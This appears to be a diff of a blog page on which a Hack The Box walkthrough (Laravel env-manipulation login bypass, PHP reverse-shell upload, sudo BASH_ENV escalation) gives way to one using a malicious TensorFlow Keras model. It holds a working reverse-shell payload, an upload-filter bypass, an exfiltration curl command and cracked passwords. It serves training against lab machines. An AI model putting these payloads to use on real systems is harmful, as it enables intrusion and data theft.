@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
     <meta name="description" content="Kaulik Makwana - Cybersecurity Engineer & Penetration Tester">
-    <title>Environment (HTB) - Walkthrough | Kaulik Makwana</title>
+    <title>Artificial (HTB) - Walkthrough | Kaulik Makwana</title>
     
     <!-- Favicon -->
     <link rel="icon" type="image/png" href="/assets/images/favicon/favicon.png">
@@ -469,21 +469,21 @@
         }
     </style>
     <!-- Begin Jekyll SEO tag v2.8.0 -->
-<title>Environment (HTB) - Walkthrough | Kaulik Makwana</title>
+<title>Artificial (HTB) - Walkthrough | Kaulik Makwana</title>
 <meta name="generator" content="Jekyll v3.10.0" />
-<meta property="og:title" content="Environment (HTB) - Walkthrough" />
+<meta property="og:title" content="Artificial (HTB) - Walkthrough" />
 <meta property="og:locale" content="en_US" />
-<meta name="description" content="-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation" />
-<meta property="og:description" content="-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation" />
-<link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" />
-<meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" />
+<meta name="description" content="Overview Exploiting TensorFlow Remote Code Execution with Malicious Model (CVE‑2024‑3660)." />
+<meta property="og:description" content="Overview Exploiting TensorFlow Remote Code Execution with Malicious Model (CVE‑2024‑3660)." />
+<link rel="canonical" href="https://kaulikmakwana.github.io/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/" />
+<meta property="og:url" content="https://kaulikmakwana.github.io/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/" />
 <meta property="og:site_name" content="Kaulik Makwana" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2025-06-26T00:00:00+00:00" />
+<meta property="article:published_time" content="2025-07-25T00:00:00+00:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Environment (HTB) - Walkthrough" />
+<meta property="twitter:title" content="Artificial (HTB) - Walkthrough" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-06-26T00:00:00+00:00","datePublished":"2025-06-26T00:00:00+00:00","description":"-&gt; Overview Exploiting CVE-2024-52301: Laravel Environment Manipulation","headline":"Environment (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/Environment-Hackthebox-Walkthrough/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-07-25T00:00:00+00:00","datePublished":"2025-07-25T00:00:00+00:00","description":"Overview Exploiting TensorFlow Remote Code Execution with Malicious Model (CVE‑2024‑3660).","headline":"Artificial (HTB) - Walkthrough","mainEntityOfPage":{"@type":"WebPage","@id":"https://kaulikmakwana.github.io/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/"},"url":"https://kaulikmakwana.github.io/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/"}</script>
 <!-- End Jekyll SEO tag -->
 
 <style>
@@ -552,10 +552,10 @@
             </div>
 
             <header class="mb-4 sm:mb-6 md:mb-8 lg:mb-10 w-full">
-                <h1 class="terminal-title text-3xl sm:text-4xl md:text-5xl font-bold mb-6 sm:mb-8 tracking-tight text-cyber-green">Environment (HTB) - Walkthrough</h1>
+                <h1 class="terminal-title text-3xl sm:text-4xl md:text-5xl font-bold mb-6 sm:mb-8 tracking-tight text-cyber-green">Artificial (HTB) - Walkthrough</h1>
                 <div class="text-gray-400 mt-1.5 sm:mt-2 font-mono text-xs sm:text-sm" data-aos="fade-up" data-aos-delay="800">
                     
-                        <span class="text-cyber-green">></span> June 26, 2025
+                        <span class="text-cyber-green">></span> July 25, 2025
                         
                         <span class="text-cyber-green mx-2">|</span> <span class="text-cyber-green">HackTheBox</span>
                         
@@ -572,29 +572,27 @@
                         @apply terminal-text text-xl sm:text-2xl font-semibold mt-6 mb-3 text-cyber-green;
                     }
                 </style>
-                <h1 id="section---overview">-&gt; Overview</h1>
-<p>Exploiting CVE-2024-52301: Laravel Environment Manipulation</p>
+                <h1 id="section-overview">Overview</h1>
+<p>Exploiting TensorFlow Remote Code Execution with Malicious Model (CVE‑2024‑3660).</p>
 
 <hr />
 
-<h1 id="section---enumeration">-&gt; Enumeration</h1>
-<h2 id="section-port-scanning">Port Scanning</h2>
-<ul>
-  <li>Started with an nmap scan:</li>
-</ul>
+<h1 id="section-enumeration">Enumeration</h1>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-A</span> <span class="nt">-T4</span> <span class="nt">-oN</span> nmap.scan 10.10.11.67
-
-Nmap scan report <span class="k">for </span>environment.htb <span class="o">(</span>10.10.11.67<span class="o">)</span>
-Host is up <span class="o">(</span>0.57s latency<span class="o">)</span><span class="nb">.</span>
+<h2 id="section-nmap-scan">Nmap scan</h2>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap -sSV -A -T4 -oN NmapScan 10.10.11.74</span>
+Nmap scan report <span class="k">for </span>artificial.htb <span class="o">(</span>10.10.11.74<span class="o">)</span>
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
 Not shown: 998 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 | ssh-hostkey: 
-|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 <span class="o">(</span>ECDSA<span class="o">)</span>
-|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab <span class="o">(</span>ED25519<span class="o">)</span>
-80/tcp open  http    nginx 1.22.1
-|_http-title: Save the Environment | environment.htb
+|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Artificial - AI Solutions
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
 Device <span class="nb">type</span>: general purpose
 Running: Linux 4.X|5.X
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
@@ -602,226 +600,416 @@ OS details: Linux 4.15 - 5.19
 Network Distance: 2 hops
 Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 
-TRACEROUTE <span class="o">(</span>using port 587/tcp<span class="o">)</span>
+TRACEROUTE <span class="o">(</span>using port 21/tcp<span class="o">)</span>
 HOP RTT       ADDRESS
-1   920.24 ms 10.10.16.1
-2   920.29 ms environment.htb <span class="o">(</span>10.10.11.67<span class="o">)</span>
+1   297.14 ms 10.10.16.1
+2   239.29 ms artificial.htb <span class="o">(</span>10.10.11.74<span class="o">)</span>
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
-<span class="c"># Nmap done at Tue Jul  8 12:46:56 2025 -- 1 IP address (1 host up) scanned in 140.75 seconds</span>
+<span class="c"># Nmap done at Thu Jul 24 21:41:28 2025 -- 1 IP address (1 host up) scanned in 18.10 seconds</span>
 </code></pre></div></div>
 
-<p>-&gt; Only two ports were open: 22 (SSH) and 80 (HTTP). The web server on port 80 appeared to be mostly static. While exploring, I found a mailing page, which        revealed the server was running PHP 8.2.28 and Laravel 11.30.0 with debug mode enabled, leaking source code.</p>
+<p>So, didn’t find something useful so next to enumerate website.</p>
 
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/rootpage-source-code.png" alt="Root page source code leak" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-24 21-36-32.png" alt="Artificial HTB main website" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/mailing.png" alt="Mailing page screenshot" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-24 21-38-12.png" alt="Website login page" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
-<p>-&gt; Next, I performed directory enumeration with dirsearch and found several useful directories:</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>dirsearch <span class="nt">-u</span> http://environment.htb/ <span class="nt">-t</span> 35 <span class="nt">-o</span> environment-dirs.md
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-24 21-38-33.png" alt="Website register page" width="1000" height="900" class="writeup-img" /></p>
+</div>
 
-<span class="c"># filtering</span>
-<span class="nv">$ </span><span class="nb">cat </span>environment-dirs.md | <span class="nb">grep </span>200
+<p>After enumerating just found login, register webpage and so by following this. I register new login on /register webpage and after login webpage analyze content.</p>
 
-200     0B   http://environment.htb/favicon.ico
-200     2KB  http://environment.htb/index.php/login/
-200     2KB  http://environment.htb/login
-200     2KB  http://environment.htb/login/
-200    24B   http://environment.htb/robots.txt
+<p>Found requirements.txt and Dockerfile files so i downloaded and read files.</p>
 
-<span class="nv">$ </span><span class="nb">cat </span>environment-dirs.md | <span class="nb">grep </span>405
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">cat </span>requirements.txt
+  tensorflow-cpu<span class="o">==</span>2.13.1
 
-405   245KB  http://environment.htb/upload
-405   245KB  http://environment.htb/upload/
-
-<span class="nv">$ </span><span class="nb">cat </span>environment-dirs.md | <span class="nb">grep </span>301
-
-301   169B   http://environment.htb/build    -&gt; REDIRECTS TO: http://environment.htb/build/
-301   169B   http://environment.htb/storage    -&gt; REDIRECTS TO: http://environment.htb/storage/
+<span class="o">&gt;</span> <span class="nb">cat </span>Dockerfile
+   FROM python:3.8-slim
+   WORKDIR /code
+   RUN apt-get update <span class="o">&amp;&amp;</span> <span class="se">\</span>
+	    apt-get <span class="nb">install</span> <span class="nt">-y</span> curl <span class="o">&amp;&amp;</span> <span class="se">\</span>
+	    curl <span class="nt">-k</span> <span class="nt">-LO</span> https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl <span class="o">&amp;&amp;</span> <span class="se">\</span>
+	    <span class="nb">rm</span> <span class="nt">-rf</span> /var/lib/apt/lists/<span class="k">*</span>
+	
+   RUN pip <span class="nb">install</span> ./tensorflow_cpu-2.13.1-cp38-cp38 manylinux_2_17_x86_64.manylinux2014_x86_64.whl
+   ENTRYPOINT <span class="o">[</span><span class="s2">"/bin/bash"</span><span class="o">]</span>
 </code></pre></div></div>
 
-<p>-&gt; I then moved to the login page and analyzed its response in Burp Suite. After entering an email and password and checking the “remember” button, I              intercepted the request.</p>
+<p>After researching I found tensorflow RCE vulnerability (CVE‑2024‑3660).
+So by utilizing this CVE we can exploit webapp.</p>
+
+<hr />
+
+<h1 id="section-exploitation">Exploitation</h1>
+
+<p>First step would be creating docker environment because for RCE there should be using same library version.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># in Dockerfile just add nano on installation path</span>
+<span class="o">&gt;</span> apt-get <span class="nb">install</span> <span class="nt">-y</span> curl nano <span class="o">&amp;&amp;</span> <span class="se">\</span>
+</code></pre></div></div>
+
+<p>Creating docker image:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> docker build <span class="nt">-t</span> exploit <span class="nb">.</span>
+</code></pre></div></div>
 
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/intercept-login-page.png" alt="Intercepted login page request in Burp Suite" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-24 21-50-23 1.png" alt="Docker image building process" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
-<div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/intercept-login-remember-boolean-manipulation.png" alt="Intercepted login page request with remember parameter manipulation" width="1000" height="900" class="writeup-img" /></p>
-</div>
+<p>Now crafting payload so we can get reverse shell.
+<code class="language-plaintext highlighter-rouge">python exploit.py</code></p>
 
-<p>-&gt; First, I tested the “remember” parameter by manipulating its value. Changing <code class="language-plaintext highlighter-rouge">remember=True</code> to <code class="language-plaintext highlighter-rouge">remember=Test</code> and forwarding the request, then refreshing the browser, resulted in a source code leak.</p>
-<div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/source-code-leak-01.png" alt="Source code leak screenshot 1" width="1000" height="900" class="writeup-img" /></p>
-</div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># exploit code
+</span><span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="n">tf</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+    <span class="kn">import</span> <span class="nn">os</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.75/4444 0&gt;&amp;1'"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">x</span>
+
+<span class="n">model</span> <span class="o">=</span> <span class="n">tf</span><span class="p">.</span><span class="n">keras</span><span class="p">.</span><span class="n">Sequential</span><span class="p">()</span>
+<span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">keras</span><span class="p">.</span><span class="n">layers</span><span class="p">.</span><span class="n">Input</span><span class="p">(</span><span class="n">shape</span><span class="o">=</span><span class="p">(</span><span class="mi">64</span><span class="p">,)))</span>
+<span class="n">model</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">tf</span><span class="p">.</span><span class="n">keras</span><span class="p">.</span><span class="n">layers</span><span class="p">.</span><span class="n">Lambda</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>
+<span class="n">model</span><span class="p">.</span><span class="nb">compile</span><span class="p">()</span>
+<span class="n">model</span><span class="p">.</span><span class="n">save</span><span class="p">(</span><span class="s">"exploit.h5"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now, run docker image and preparing for exploit.py payload:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># run docker container</span>
+<span class="o">&gt;</span> docker run <span class="nt">-it</span> exploit
+
+<span class="c"># now copy exploit.py code and paste in this image and execute it</span>
+<span class="o">&gt;</span> python exploit.py
+
+<span class="c"># it should create exploit.h5 payload </span>
+<span class="c"># now download this exploit from docker image container to local machine via simple python http server.</span>
+</code></pre></div></div>
 
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/source-code-leak-02.png" alt="Source code leak screenshot 2" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725224517.png" alt="Exploit payload generation" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
 <hr />
-<h1 id="section---exploitation">-&gt; Exploitation</h1>
-<p>-&gt; After refreshing the page, I observed a source code leak. Analyzing the code, I found a <code class="language-plaintext highlighter-rouge">preprod</code> environment variable configured to allow direct login and     dashboard access. This is where CVE-2024-52301 can be exploited using Burp Suite.</p>
 
-<p>-&gt; I started Burp Suite, refreshed the browser, navigated to the login page, intercepted the request, modified it, and forwarded it.</p>
+<h3 id="section-we-have-final-payload-and-now-just-fireup-ncat-revshell-and-upload-exploith5-to-webapp">We have final payload and now just fireup ncat revshell and upload exploit.h5 to webapp.</h3>
 
-<div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/Intercapt-login-page-bypass-preprod-variable-misconfig.png" alt="Bypassing login via preprod variable misconfiguration" width="1000" height="900" class="writeup-img" /></p>
-</div>
-
-<p>-&gt; To bypass the login, I captured the login request, modified the parameter, and forwarded it:</p>
-<ul>
-  <li>Modified the login parameter to <code class="language-plaintext highlighter-rouge">/login?--env=preprod</code> and forwarded the request.</li>
-</ul>
-
-<div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/bypass-login-page-access-dashboard.png" alt="Bypassed login page, accessing dashboard" width="1000" height="900" class="writeup-img" /></p>
-</div>
-
-<div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/dashboard.png" alt="Dashboard screenshot" width="1000" height="900" class="writeup-img" /></p>
-</div>
-
-<p>-&gt; This allowed me to bypass the login page and access the dashboard. Next, I attempted to upload a reverse shell. I navigated to the profile section and tried    to change the profile photo for user “hish.” The image upload feature was abused to upload a reverse shell.</p>
-
-<p>-&gt; To upload the reverse shell, I started interception and attempted to upload the shell directly, capturing the request:</p>
-
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Reverse shell used:</span>
-/usr/share/webshells/php/php-reverse-shell.php
-<span class="c"># Upload it.</span>
+<p>Fireup ncat:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> rlwrap ncat <span class="nt">-nvlp</span> 4444
 </code></pre></div></div>
 
-<p>-&gt; While intercepting, I modified the request content type and file name, then forwarded it:</p>
-<ul>
-  <li>filename=”rev-shell.php.”</li>
-  <li>content-type: image/gif</li>
-  <li>Added GIF header <code class="language-plaintext highlighter-rouge">GIF89a</code> before the <code class="language-plaintext highlighter-rouge">&lt;?php</code> tag in the shell script</li>
-  <li>Forwarded the request</li>
-</ul>
+<p>Upload exploit.h5 payload:</p>
 
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/reverse-shell-upload-01.png" alt="Reverse shell upload attempt screenshot" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-25 22-48-13.png" alt="Uploading malicious model file" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
-<p>-&gt; This succeeded. Initially, uploading with the default filename <code class="language-plaintext highlighter-rouge">rev-shell.php</code> did not work, but changing the extension to <code class="language-plaintext highlighter-rouge">php.</code> allowed the upload, and I received a shell.</p>
+<p>By clicking on ‘View Predictions’ we can finally get reverse shell.</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rlwrap ncat <span class="nt">-nvlp</span> 1234 
-Ncat: Version 7.95 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
-Ncat: Listening on <span class="o">[</span>::]:1234
-Ncat: Listening on 0.0.0.0:1234
-Ncat: Connection from 10.10.11.67:56816.
-<span class="nv">$ </span><span class="nb">whoami
-</span>www-data
-<span class="nv">$ </span>/bin/bash <span class="nt">-i</span>
-www-data@environment: <span class="nb">cd</span> /home/hish
-www-data@environment: <span class="nb">ls
-</span>backup
-exp.sh
-user.txt
-www-data@environment: <span class="nb">cat</span> /home/hish/user.txt
-44b9d##########################
-</code></pre></div></div>
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-25 22-49-08.png" alt="Getting reverse shell connection" width="1000" height="900" class="writeup-img" /></p>
+</div>
 
-<p>User flag obtained.</p>
+<h4 id="section-yep-we-got-internal-access-now-time-for-post-exploitation">Yep, we got internal access.. now time for <code class="language-plaintext highlighter-rouge">Post-Exploitation</code></h4>
 
 <hr />
-<h1 id="section---post-exploitation">-&gt; Post-Exploitation</h1>
-<h2 id="section-privilege-escalation">Privilege Escalation</h2>
 
-<p>-&gt; To escalate privileges, I needed access to the user account. I found a <code class="language-plaintext highlighter-rouge">backup</code> directory under <code class="language-plaintext highlighter-rouge">/home/hish</code> containing a GPG-encrypted file: <code class="language-plaintext highlighter-rouge">keyvault.gpg</code>.</p>
+<h1 id="section-post-exploitation">Post-Exploitation</h1>
 
-<p>To decrypt it:</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check file type to confirm it's a GPG file</span>
-www-data@environment:/home/hish/backup<span class="nv">$ </span>file keyvault.gpg
-keyvault.gpg: PGP RSA encrypted session key - keyid: B755B0ED D6CFCFD3 RSA <span class="o">(</span>Encrypt or Sign<span class="o">)</span> 2048b <span class="nb">.</span>
+<p>Currently we have user <code class="language-plaintext highlighter-rouge">app</code> access so we have limited permission so we need to enumerate for higher user access.</p>
 
-<span class="c"># Copy keyvault.gpg and .gnupg to /tmp</span>
-www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cp </span>keyvault.gpg /tmp
-www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cp</span> <span class="nt">-r</span> .gnupg /tmp
-www-data@environment:/home/hish/backup<span class="nv">$ </span><span class="nb">cd</span> /tmp/
+<h2 id="section--local-enumeration">[+] Local enumeration</h2>
 
-<span class="c"># Set GPG environment</span>
-www-data@environment:/tmp<span class="nv">$ </span><span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/tmp
+<p>Found there is user gael but we don’t have permission to view its content.</p>
 
-<span class="c"># List secret keys</span>
-www-data@environment:/tmp<span class="nv">$ </span>gpg <span class="nt">--list-secret-keys</span>
-gpg: WARNING: unsafe permissions on homedir <span class="s1">'/tmp//.gnupg'</span>
-/tmp//.gnupg/pubring.kbx
-<span class="nt">------------------------</span>
-pub   rsa2048 2025-01-11 <span class="o">[</span>SC]
-      F45830DFB638E66CD8B752A012F42AE5117FFD8E
-uid           <span class="o">[</span>ultimate] hish_ &lt;hish@environment.htb&gt;
-sub   rsa2048 2025-01-11 <span class="o">[</span>E]
-
-<span class="c"># Decrypt the file</span>
-www-data@environment:/tmp<span class="nv">$ </span>gpg <span class="nt">--decrypt</span> keyvault.gpg
-gpg: WARNING: unsafe permissions on homedir <span class="s1">'/tmp//.gnupg'</span>
-gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
-      <span class="s2">"hish_ &lt;hish@environment.htb&gt;"</span>
-PAYPAL.COM -&gt; Ihaves0meMon<span class="nv">$yhere123</span>
-ENVIRONMENT.HTB -&gt; marineSPm@ster!!
-FACEBOOK.COM -&gt; summerSunnyB3ACH!!
-
-Password found:  marineSPm@ster!!
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>app@artificial:~/app<span class="nv">$ </span><span class="nb">whoami
+whoami
+</span>app
+app@artificial:~/app<span class="nv">$ </span><span class="nb">ls</span> /home/
+<span class="nb">ls</span> /home/
+app
+config
+data
+gael
+index
+keys
+locks
+snapshots
+app@artificial:~/app<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /home/gael/
+<span class="nb">ls</span> <span class="nt">-la</span> /home/gael/
+<span class="nb">ls</span>: cannot open directory <span class="s1">'/home/gael/'</span>: Permission denied
+app@artificial:~/app<span class="nv">$ </span>
 </code></pre></div></div>
 
-<ul>
-  <li>I then attempted SSH access:</li>
-</ul>
+<p>I noticed in <code class="language-plaintext highlighter-rouge">~/app/instance</code> dir there is <code class="language-plaintext highlighter-rouge">users.db</code> file so i downloaded it. For data exfiltration i am using raven tool which is fine and easy to use without breaking shell.</p>
+
+<p>On host machine:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># just type raven ## make sure tool is installed via apt.</span>
+<span class="o">&gt;</span> raven 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Serving HTTP on 0.0.0.0 port 8080 <span class="o">(</span>http://0.0.0.0:8080/<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listener access is unrestricted
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploads will be saved <span class="k">in</span> /home/kaulik/Documents/WalkThroughs/Hackthebox/Artificial
+<span class="c"># you can use other popular techniques like python -m http.server and else..</span>
+</code></pre></div></div>
+
+<p>On compromise host:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-X</span> POST http://10.10.16.75:8080/ <span class="nt">-F</span> <span class="s2">"file=@users.db;type=application/octet-stream"</span>
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100 25002    0   226  100 24776    142  15661  0:00:01  0:00:01 <span class="nt">--</span>:--:-- 15804
+&lt;<span class="o">!</span>DOCTYPE html&gt;
+&lt;html <span class="nv">lang</span><span class="o">=</span><span class="s2">"en"</span><span class="o">&gt;</span>
+&lt;<span class="nb">head</span><span class="o">&gt;</span>
+&lt;meta http-equiv<span class="o">=</span><span class="s2">"refresh"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"3;url=/"</span> <span class="nv">charset</span><span class="o">=</span><span class="s2">"utf-8"</span><span class="o">&gt;</span>
+&lt;title&gt;Redirecting...&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;p&gt;File uploaded successfully. Redirecting <span class="k">in </span>3 seconds...&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
 <div align="center">
-  <p><img src="/assets/images/writeups/hackthebox/Environment/ssh-hish.png" alt="SSH as user hish" width="1000" height="900" class="writeup-img" /></p>
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725231255.png" alt="File upload successful" width="1000" height="900" class="writeup-img" /></p>
 </div>
 
-<h3 id="section-root-access">Root Access</h3>
-<p>I began by checking sudo permissions:</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hish@environment:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
-Matching Defaults entries <span class="k">for </span>hish on environment:
-    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin, env_keep+<span class="o">=</span><span class="s2">"ENV BASH_ENV"</span>, use_pty
+<p>Now time to analyze users.db:</p>
 
-User hish may run the following commands on environment:
-    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/systeminfo
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file users.db
+users.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 55, database pages 6, cookie 0x2, schema 4, UTF-8, version-valid-for 55
 </code></pre></div></div>
 
-<p>-&gt; The <code class="language-plaintext highlighter-rouge">systeminfo</code> binary could be run as root, and the <code class="language-plaintext highlighter-rouge">env_keep</code> variable was misconfigured, allowing a custom <code class="language-plaintext highlighter-rouge">BASH_ENV</code> to be passed to sudo.</p>
+<p>So its sqlite database so I am using sqlitebrowser for easy use.
+<code class="language-plaintext highlighter-rouge">sqlitebrowser users.db</code></p>
 
-<p>-&gt; To exploit this, I created <code class="language-plaintext highlighter-rouge">/tmp/root.sh</code> with the content <code class="language-plaintext highlighter-rouge">/bin/bash -i</code> and made it executable:</p>
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hish@environment:/tmp<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -i'</span> <span class="o">&gt;</span> /tmp/root.sh
-hish@environment:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x /tmp/root.sh
-hish@environment:/tmp<span class="nv">$ </span><span class="nb">sudo </span><span class="nv">BASH_ENV</span><span class="o">=</span>/tmp/root.sh /usr/bin/systeminfo
-root@environment:/tmp#     
-root@environment:/tmp# <span class="nb">cat</span> /root/root.txt
-e458###########################
+<p>Now navigate Browse data &gt; select table to ‘user’ and got user and hash.</p>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725231913.png" alt="SQLite database analysis showing user hash" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<p>Now we have user and hash so next step would be cracking.</p>
+
+<h3 id="section-cracking-hash">Cracking hash</h3>
+
+<p>Identify hash:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> hash-identifier c99175974b6e192936d97224638a34f8 
+  Possible Hashs:
+  <span class="o">[</span>+] MD5
+  <span class="o">[</span>+] Domain Cached Credentials - MD4<span class="o">(</span>MD4<span class="o">((</span><span class="nv">$pass</span><span class="o">))</span>.<span class="o">(</span>strtolower<span class="o">(</span><span class="nv">$username</span><span class="o">)))</span>
 </code></pre></div></div>
+
+<p>Going with MD5 with john:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> john gaelhash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nt">--format</span><span class="o">=</span>Raw-MD5
